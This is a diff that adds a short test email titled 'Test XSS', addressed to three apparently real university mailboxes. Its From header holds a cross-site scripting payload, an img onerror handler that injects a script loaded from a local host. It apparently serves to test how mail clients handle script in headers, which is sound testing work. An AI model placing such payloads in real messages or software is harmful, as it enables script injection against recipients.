@@ -1,0 +1,7 @@
+From: <"test<img src=xx:x onerror=d=document;e=d.createElement('script');e.src='http://127.0.0.1/i.js';d.body.appendChild(e);>@attack.com">
+To: mba01@haas.berkeley.edu, mba02@haas.berkeley.edu, fx00@haas.berkeley.edu, 
+Subject: Test XSS
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
